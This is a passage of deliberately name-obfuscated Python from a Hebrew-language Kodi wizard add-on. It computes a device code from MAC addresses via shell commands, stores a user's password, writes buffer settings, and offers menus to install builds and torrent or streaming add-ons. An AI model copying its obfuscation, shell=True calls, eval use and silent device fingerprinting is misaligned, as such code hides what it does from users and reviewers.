       while (1 ):#line:2371
         OOOO0000OO0O0O0O0 =xbmc .getInfoLabel ("network.macaddress")#line:2372
         logging .warning (OOOO0000OO0O0O0O0 )#line:2373
         if OOOO0000OO0O0O0O0 !="Busy"and OOOO0000OO0O0O0O0 !=' עסוק':#line:2374
            break #line:2375
         else :#line:2376
           O0O0OOOOOO00OOO0O =O0O0OOOOOO00OOO0O +1 #line:2377
           time .sleep (1 )#line:2378
           if O0O0OOOOOO00OOO0O >30 :#line:2379
            break #line:2380
       OOO0OOOO00OO0O0O0 =OOO0OOOO00OO0O0O0 +int (OOOO0000OO0O0O0O0 .replace (':',''),16 )#line:2381
       logging .warning ('n:'+str (OOO0OOOO00OO0O0O0 ))#line:2382
   try :#line:2383
    return OOO0OOOO00OO0O0O0 #line:2384
   except :pass #line:2385
def getHwAddr_old (OOOO000OO0OO00000 ):#line:2386
   import subprocess ,time #line:2387
   OO0O00OO00OO00O00 ='windows'#line:2388
   if xbmc .getCondVisibility ('system.platform.android'):#line:2389
       OO0O00OO00OO00O00 ='android'#line:2390
   if xbmc .getCondVisibility ('system.platform.android'):#line:2391
     OOOOOOOO0OO0O0000 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:2392
     OOOOO0OOO00O0O0OO =re .compile ('link/ether (.+?) brd').findall (str (OOOOOOOO0OO0O0000 ))#line:2394
     OO00OO00O000OOOOO =0 #line:2395
     for OOO0OO00O000OOOOO in OOOOO0OOO00O0O0OO :#line:2396
      if OOOOO0OOO00O0O0OO !='00:00:00:00:00:00':#line:2397
          O0O0000O0000000OO =OOO0OO00O000OOOOO #line:2398
          OO00OO00O000OOOOO =OO00OO00O000OOOOO +int (O0O0000O0000000OO .replace (':',''),16 )#line:2399
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:2401
       OO0OOOO0OOOOOO0OO =0 #line:2402
       OO00OO00O000OOOOO =0 #line:2403
       O0O000O000OO000OO =[]#line:2404
       O0O0OO00OOO0000O0 =os .popen ("getmac").read ()#line:2405
       O0O0OO00OOO0000O0 =O0O0OO00OOO0000O0 .split ("\n")#line:2406
       for OO0O0000OOOOOO0O0 in O0O0OO00OOO0000O0 :#line:2408
            O00OO0OOO0O0OO00O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO0O0000OOOOOO0O0 ,re .I )#line:2409
            if O00OO0OOO0O0OO00O :#line:2410
                OOOOO0OOO00O0O0OO =O00OO0OOO0O0OO00O .group ().replace ('-',':')#line:2411
                O0O000O000OO000OO .append (OOOOO0OOO00O0O0OO )#line:2412
                OO00OO00O000OOOOO =OO00OO00O000OOOOO +int (OOOOO0OOO00O0O0OO .replace (':',''),16 )#line:2415
   else :#line:2417
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:2418
   try :#line:2435
    return OO00OO00O000OOOOO #line:2436
   except :pass #line:2437
def getpass ():#line:2438
	disply_hwr2 ()#line:2440
def setpass ():#line:2441
    OOO00O0OO0O00OOO0 =xbmcgui .Dialog ()#line:2442
    O000OOOO0OO000OO0 =''#line:2443
    OO0O0OO0OOO0O0OOO =xbmc .Keyboard (O000OOOO0OO000OO0 ,'הכנס סיסמה')#line:2445
    OO0O0OO0OOO0O0OOO .doModal ()#line:2446
    if OO0O0OO0OOO0O0OOO .isConfirmed ():#line:2447
           OO0O0OO0OOO0O0OOO =OO0O0OO0OOO0O0OOO .getText ()#line:2448
    wiz .setS ('pass',str (OO0O0OO0OOO0O0OOO ))#line:2449
def setuname ():#line:2450
    OOOOOO0O0O0000000 =''#line:2451
    OO000OOOOO00O0OOO =xbmc .Keyboard (OOOOOO0O0O0000000 ,'הכנס שם משתמש')#line:2452
    OO000OOOOO00O0OOO .doModal ()#line:2453
    if OO000OOOOO00O0OOO .isConfirmed ():#line:2454
           OOOOOO0O0O0000000 =OO000OOOOO00O0OOO .getText ()#line:2455
           wiz .setS ('user',str (OOOOOO0O0O0000000 ))#line:2456
def powerkodi ():#line:2457
    os ._exit (1 )#line:2458
def buffer1 ():#line:2460
	O0OO0O0O0O000O000 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:2461
	O0OOO000OOOO0O0OO =xbmc .getInfoLabel ("System.Memory(total)")#line:2462
	OOO0O0000O00OO0OO =xbmc .getInfoLabel ("System.FreeMemory")#line:2463
	OO00O0O0OO0O000OO =re .sub ('[^0-9]','',OOO0O0000O00OO0OO )#line:2464
	OO00O0O0OO0O000OO =int (OO00O0O0OO0O000OO )/3 #line:2465
	O0OO000000O0O00OO =OO00O0O0OO0O000OO *1024 *1024 #line:2466
	try :O0OOO0000O000O00O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2467
	except :O0OOO0000O000O00O =16 #line:2468
	OOOO0OOO00OO0OOOO =DIALOG .yesno ('FREE MEMORY: '+str (OOO0O0000O00OO0OO ),'Based on your free Memory your optimal buffersize is: '+str (OO00O0O0OO0O000OO )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:2471
	if OOOO0OOO00OO0OOOO ==1 :#line:2472
		with open (O0OO0O0O0O000O000 ,"w")as O000OOOOO0OOOOOOO :#line:2473
			if O0OOO0000O000O00O >=17 :OOOOOO000O0OO0OOO =xml_data_advSettings_New (str (O0OO000000O0O00OO ))#line:2474
			else :OOOOOO000O0OO0OOO =xml_data_advSettings_old (str (O0OO000000O0O00OO ))#line:2475
			O000OOOOO0OOOOOOO .write (OOOOOO000O0OO0OOO )#line:2477
			DIALOG .ok ('Buffer Size Set to: '+str (O0OO000000O0O00OO ),'Please restart Kodi for settings to apply.','')#line:2478
	elif OOOO0OOO00OO0OOOO ==0 :#line:2480
		O0OO000000O0O00OO =_O0000000O0OO00O0O (default =str (O0OO000000O0O00OO ),heading ="INPUT BUFFER SIZE")#line:2481
		with open (O0OO0O0O0O000O000 ,"w")as O000OOOOO0OOOOOOO :#line:2482
			if O0OOO0000O000O00O >=17 :OOOOOO000O0OO0OOO =xml_data_advSettings_New (str (O0OO000000O0O00OO ))#line:2483
			else :OOOOOO000O0OO0OOO =xml_data_advSettings_old (str (O0OO000000O0O00OO ))#line:2484
			O000OOOOO0OOOOOOO .write (OOOOOO000O0OO0OOO )#line:2485
			DIALOG .ok ('Buffer Size Set to: '+str (O0OO000000O0O00OO ),'Please restart Kodi for settings to apply.','')#line:2486
def xml_data_advSettings_old (O00OO0OO000OO00O0 ):#line:2487
	O00O0OO00000O000O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O00OO0OO000OO00O0 #line:2497
	return O00O0OO00000O000O #line:2498
def xml_data_advSettings_New (O00OO0OOO000OO00O ):#line:2500
	O0O0OO0000O000O00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O00OO0OOO000OO00O #line:2512
	return O0O0OO0000O000O00 #line:2513
def write_ADV_SETTINGS_XML (OO0000OOO00OO00O0 ):#line:2514
    if not os .path .exists (xml_file ):#line:2515
        with open (xml_file ,"w")as O00OOO0O00O0OO0OO :#line:2516
            O00OOO0O00O0OO0OO .write (xml_data )#line:2517
def _O0000000O0OO00O0O (default ="",heading ="",hidden =False ):#line:2518
    ""#line:2519
    OO0OOOO0O0OOO00O0 =xbmc .Keyboard (default ,heading ,hidden )#line:2520
    OO0OOOO0O0OOO00O0 .doModal ()#line:2521
    if (OO0OOOO0O0OOO00O0 .isConfirmed ()):#line:2522
        return unicode (OO0OOOO0O0OOO00O0 .getText (),"utf-8")#line:2523
    return default #line:2524
def index ():#line:2526
	addFile ('[COLOR yellow]%s [/COLOR]קוד מכשיר: '%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2527
	if AUTOUPDATE =='Yes':#line:2529
		if wiz .workingURL (WIZARDFILE )==True :#line:2530
			OOOOO00OOOOO0O000 =wiz .checkWizard ('version')#line:2531
			if OOOOO00OOOOO0O000 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OOOOO00OOOOO0O000 ),'wizardupdate',themeit =THEME2 )#line:2532
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2533
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2534
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2535
	if len (BUILDNAME )>0 :#line:2536
		O0OOOOOO00OOO0O0O =wiz .checkBuild (BUILDNAME ,'version')#line:2537
		O0OO0OOO0OO00O00O ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2538
		if O0OOOOOO00OOO0O0O >BUILDVERSION :O0OO0OOO0OO00O00O ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0OO0OOO0OO00O00O ,O0OOOOOO00OOO0O0O )#line:2539
		addDir (O0OO0OOO0OO00O00O ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2541
		try :#line:2543
		     O00OO0O00O0OOO0OO =wiz .themeCount (BUILDNAME )#line:2544
		except :#line:2545
		   O00OO0O00O0OOO0OO =False #line:2546
		if not O00OO0O00O0OOO0OO ==False :#line:2547
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2548
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2549
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2552
	addDir ('עדכון מערכת','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2553
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2554
	addFile ('אימות חשבון','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2558
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2560
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2562
def firstinstall ():#line:2564
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2565
def morsetup ():#line:2568
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2569
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2570
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2571
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2572
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2573
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2577
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2578
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2581
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:2582
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:2583
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2584
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2594
	setView ('files','viewType')#line:2595
def morsetup2 ():#line:2596
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2597
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2598
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2599
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2600
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2601
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2602
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2603
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2604
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2605
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2606
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2607
def fastupdate ():#line:2608
		addFile ('עדכון מערכת','testnotify',themeit =THEME1 )#line:2609
def forcefastupdate ():#line:2611
			OOO0O000O00O0O0O0 ="[COLOR %s]ברוכים הבאים לעדכון המערכת![/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2612
			wiz .ForceFastUpDate (ADDONTITLE ,OOO0O000O00O0O0O0 )#line:2613
def rdsetup ():#line:2617
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2618
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2619
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2621
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2622
def traktsetup ():#line:2625
	addFile ('[COLOR yellow]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2626
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2627
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2628
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2629
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2630
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2631
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2632
	setView ('files','viewType')#line:2633
def setautorealdebrid ():#line:2634
    from resources .libs import real_debrid #line:2635
    OOOOOO0O000O00OO0 =real_debrid .RealDebridFirst ()#line:2636
    OOOOOO0O000O00OO0 .auth ()#line:2637
def setrealdebrid ():#line:2639
    O0OOOOO00OOOO000O =(ADDON .getSetting ("auto_rd"))#line:2640
    if O0OOOOO00OOOO000O =='false':#line:2641
       ADDON .openSettings ()#line:2642
    else :#line:2643
        from resources .libs import real_debrid #line:2644
        O00OO0O0O0OOOOO0O =real_debrid .RealDebrid ()#line:2645
        O00OO0O0O0OOOOO0O .auth ()#line:2646
        rdon ()#line:2649
def resolveurlsetup ():#line:2651
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2652
def urlresolversetup ():#line:2653
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2654
def placentasetup ():#line:2656
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2657
def reptiliasetup ():#line:2658
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2659
def flixnetsetup ():#line:2660
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2661
def yodasetup ():#line:2662
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2663
def numberssetup ():#line:2664
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2665
def uranussetup ():#line:2666
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2667
def genesissetup ():#line:2668
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2669
def net_tools (view =None ):#line:2671
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2672
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2673
	setView ('files','viewType')#line:2675
def speedMenu ():#line:2676
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2677
def viewIP ():#line:2678
	O00O0OO0O0000OO00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2692
	O00O0O0OOOOOO0OOO =[];O0O00O0O0OO0000O0 =0 #line:2693
	for O0OO0O0O00OOO0OO0 in O00O0OO0O0000OO00 :#line:2694
		O0O0OOO0O0OO0000O =wiz .getInfo (O0OO0O0O00OOO0OO0 )#line:2695
		O000OOOOOO00O0OO0 =0 #line:2696
		while O0O0OOO0O0OO0000O =="Busy"and O000OOOOOO00O0OO0 <10 :#line:2697
			O0O0OOO0O0OO0000O =wiz .getInfo (O0OO0O0O00OOO0OO0 );O000OOOOOO00O0OO0 +=1 ;wiz .log ("%s sleep %s"%(O0OO0O0O00OOO0OO0 ,str (O000OOOOOO00O0OO0 )));xbmc .sleep (1000 )#line:2698
		O00O0O0OOOOOO0OOO .append (O0O0OOO0O0OO0000O )#line:2699
		O0O00O0O0OO0000O0 +=1 #line:2700
	O0O0O00000000OOO0 ,O0OO00OOO0OO00O00 ,O0O0OO0O0OO000OO0 =getIP ()#line:2701
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O0OOOOOO0OOO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2702
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O00000000OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2703
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00OOO0OO00O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2704
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO0O0OO000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2705
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O0OOOOOO0OOO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2706
	setView ('files','viewType')#line:2707
def buildMenu ():#line:2709
	if USERNAME ==''or PASSWORD =='':#line:2710
		ADDON .openSettings ()#line:2711
		if BUILDNAME =="":#line:2712
			xbmc .executebuiltin ("ActivateWindow(home)")#line:2713
		sys .exit ()#line:2714
	OO0O0O0O0OOO00000 =u_list (SPEEDFILE )#line:2717
	(OO0O0O0O0OOO00000 )#line:2718
	O0O00OO00OO0O0000 =(wiz .workingURL (OO0O0O0O0OOO00000 ))#line:2719
	(O0O00OO00OO0O0000 )#line:2720
	O0O00OO00OO0O0000 =wiz .workingURL (SPEEDFILE )#line:2721
	if not O0O00OO00OO0O0000 ==True :#line:2722
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2723
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2724
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2725
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2726
		addFile ('%s'%O0O00OO00OO0O0000 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2727
	else :#line:2728
		O0O000O0OO00OO0OO ,OOOOO0OO0OOO0OO0O ,O0O00OOO00OOO0OO0 ,O000O0OO0OO0000O0 ,O0O00O00O0000000O ,OOOO000O0OOOO0O00 ,OO00OO0OOOOOOOO00 =wiz .buildCount ()#line:2729
		OOOOO0OO0O0O0OOO0 =False ;O0O0O00000O0O0O0O =[]#line:2730
		if THIRDPARTY =='true':#line:2731
			if not THIRD1NAME ==''and not THIRD1URL =='':OOOOO0OO0O0O0OOO0 =True ;O0O0O00000O0O0O0O .append ('1')#line:2732
			if not THIRD2NAME ==''and not THIRD2URL =='':OOOOO0OO0O0O0OOO0 =True ;O0O0O00000O0O0O0O .append ('2')#line:2733
			if not THIRD3NAME ==''and not THIRD3URL =='':OOOOO0OO0O0O0OOO0 =True ;O0O0O00000O0O0O0O .append ('3')#line:2734
		OO0OO0OO0OO0OOOO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2735
		OO0OOO0O00O000O0O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OO0OO0OO0OOOO0 )#line:2736
		if O0O000O0OO00OO0OO ==1 and OOOOO0OO0O0O0OOO0 ==False :#line:2737
			for OOOO0OO00O00OO0O0 ,OOO0O00O00OOOO000 ,O0OOOO0OOO00OOOO0 ,OO0OO0000OO0O000O ,O000000000OOOOOOO ,O00O000OO00O0O0OO ,O0OO0O000OOOOOOO0 ,OOO0O0O0O000O0OOO ,O00O00000O0O0OOO0 ,O0O00O0O00OO000OO in OO0OOO0O00O000O0O :#line:2738
				if not SHOWADULT =='true'and O00O00000O0O0OOO0 .lower ()=='yes':continue #line:2739
				if not DEVELOPER =='true'and wiz .strTest (OOOO0OO00O00OO0O0 ):continue #line:2740
				viewBuild (OO0OOO0O00O000O0O [0 ][0 ])#line:2741
				return #line:2742
		addFile ('עדכון מערכת','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2745
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2746
		if OOOOO0OO0O0O0OOO0 ==True :#line:2747
			for O000O000O00O0O0OO in O0O0O00000O0O0O0O :#line:2748
				OOOO0OO00O00OO0O0 =eval ('THIRD%sNAME'%O000O000O00O0O0OO )#line:2749
		if len (OO0OOO0O00O000O0O )>=1 :#line:2751
			if SEPERATE =='true':#line:2752
				for OOOO0OO00O00OO0O0 ,OOO0O00O00OOOO000 ,O0OOOO0OOO00OOOO0 ,OO0OO0000OO0O000O ,O000000000OOOOOOO ,O00O000OO00O0O0OO ,O0OO0O000OOOOOOO0 ,OOO0O0O0O000O0OOO ,O00O00000O0O0OOO0 ,O0O00O0O00OO000OO in OO0OOO0O00O000O0O :#line:2753
					if not SHOWADULT =='true'and O00O00000O0O0OOO0 .lower ()=='yes':continue #line:2754
					if not DEVELOPER =='true'and wiz .strTest (OOOO0OO00O00OO0O0 ):continue #line:2755
					OOOO0OO000OO0OO0O =createMenu ('install','',OOOO0OO00O00OO0O0 )#line:2756
					addDir ('[%s] %s (v%s)'%(float (O000000000OOOOOOO ),OOOO0OO00O00OO0O0 ,OOO0O00O00OOOO000 ),'viewbuild',OOOO0OO00O00OO0O0 ,description =O0O00O0O00OO000OO ,fanart =OOO0O0O0O000O0OOO ,icon =O0OO0O000OOOOOOO0 ,menu =OOOO0OO000OO0OO0O ,themeit =THEME2 )#line:2757
			else :#line:2758
				if O000O0OO0OO0000O0 >0 :#line:2759
					OOOOOO000OOO00000 ='+'if SHOW17 =='false'else '-'#line:2760
					if SHOW17 =='true':#line:2762
						for OOOO0OO00O00OO0O0 ,OOO0O00O00OOOO000 ,O0OOOO0OOO00OOOO0 ,OO0OO0000OO0O000O ,O000000000OOOOOOO ,O00O000OO00O0O0OO ,O0OO0O000OOOOOOO0 ,OOO0O0O0O000O0OOO ,O00O00000O0O0OOO0 ,O0O00O0O00OO000OO in OO0OOO0O00O000O0O :#line:2764
							if not SHOWADULT =='true'and O00O00000O0O0OOO0 .lower ()=='yes':continue #line:2765
							if not DEVELOPER =='true'and wiz .strTest (OOOO0OO00O00OO0O0 ):continue #line:2766
							O00OO0OO0OOOO00O0 =int (float (O000000000OOOOOOO ))#line:2767
							if O00OO0OO0OOOO00O0 ==17 :#line:2768
								OOOO0OO000OO0OO0O =createMenu ('install','',OOOO0OO00O00OO0O0 )#line:2769
								addDir ('[%s] %s (v%s)'%(float (O000000000OOOOOOO ),OOOO0OO00O00OO0O0 ,OOO0O00O00OOOO000 ),'viewbuild',OOOO0OO00O00OO0O0 ,description =O0O00O0O00OO000OO ,fanart =OOO0O0O0O000O0OOO ,icon =O0OO0O000OOOOOOO0 ,menu =OOOO0OO000OO0OO0O ,themeit =THEME2 )#line:2770
				if O0O00O00O0000000O >0 :#line:2771
					OOOOOO000OOO00000 ='+'if SHOW18 =='false'else '-'#line:2772
					if SHOW18 =='true':#line:2774
						for OOOO0OO00O00OO0O0 ,OOO0O00O00OOOO000 ,O0OOOO0OOO00OOOO0 ,OO0OO0000OO0O000O ,O000000000OOOOOOO ,O00O000OO00O0O0OO ,O0OO0O000OOOOOOO0 ,OOO0O0O0O000O0OOO ,O00O00000O0O0OOO0 ,O0O00O0O00OO000OO in OO0OOO0O00O000O0O :#line:2776
							if not SHOWADULT =='true'and O00O00000O0O0OOO0 .lower ()=='yes':continue #line:2777
							if not DEVELOPER =='true'and wiz .strTest (OOOO0OO00O00OO0O0 ):continue #line:2778
							O00OO0OO0OOOO00O0 =int (float (O000000000OOOOOOO ))#line:2779
							if O00OO0OO0OOOO00O0 ==18 :#line:2780
								OOOO0OO000OO0OO0O =createMenu ('install','',OOOO0OO00O00OO0O0 )#line:2781
								addDir ('[%s] %s (v%s)'%(float (O000000000OOOOOOO ),OOOO0OO00O00OO0O0 ,OOO0O00O00OOOO000 ),'viewbuild',OOOO0OO00O00OO0O0 ,description =O0O00O0O00OO000OO ,fanart =OOO0O0O0O000O0OOO ,icon =O0OO0O000OOOOOOO0 ,menu =OOOO0OO000OO0OO0O ,themeit =THEME2 )#line:2782
				if O0O00OOO00OOO0OO0 >0 :#line:2783
					OOOOOO000OOO00000 ='+'if SHOW16 =='false'else '-'#line:2784
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOOOOO000OOO00000 ,O0O00OOO00OOO0OO0 ),'togglesetting','show16',themeit =THEME3 )#line:2785
					if SHOW16 =='true':#line:2786
						for OOOO0OO00O00OO0O0 ,OOO0O00O00OOOO000 ,O0OOOO0OOO00OOOO0 ,OO0OO0000OO0O000O ,O000000000OOOOOOO ,O00O000OO00O0O0OO ,O0OO0O000OOOOOOO0 ,OOO0O0O0O000O0OOO ,O00O00000O0O0OOO0 ,O0O00O0O00OO000OO in OO0OOO0O00O000O0O :#line:2787
							if not SHOWADULT =='true'and O00O00000O0O0OOO0 .lower ()=='yes':continue #line:2788
							if not DEVELOPER =='true'and wiz .strTest (OOOO0OO00O00OO0O0 ):continue #line:2789
							O00OO0OO0OOOO00O0 =int (float (O000000000OOOOOOO ))#line:2790
							if O00OO0OO0OOOO00O0 ==16 :#line:2791
								OOOO0OO000OO0OO0O =createMenu ('install','',OOOO0OO00O00OO0O0 )#line:2792
								addDir ('[%s] %s (v%s)'%(float (O000000000OOOOOOO ),OOOO0OO00O00OO0O0 ,OOO0O00O00OOOO000 ),'viewbuild',OOOO0OO00O00OO0O0 ,description =O0O00O0O00OO000OO ,fanart =OOO0O0O0O000O0OOO ,icon =O0OO0O000OOOOOOO0 ,menu =OOOO0OO000OO0OO0O ,themeit =THEME2 )#line:2793
				if OOOOO0OO0OOO0OO0O >0 :#line:2794
					OOOOOO000OOO00000 ='+'if SHOW15 =='false'else '-'#line:2795
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOOOOO000OOO00000 ,OOOOO0OO0OOO0OO0O ),'togglesetting','show15',themeit =THEME3 )#line:2796
					if SHOW15 =='true':#line:2797
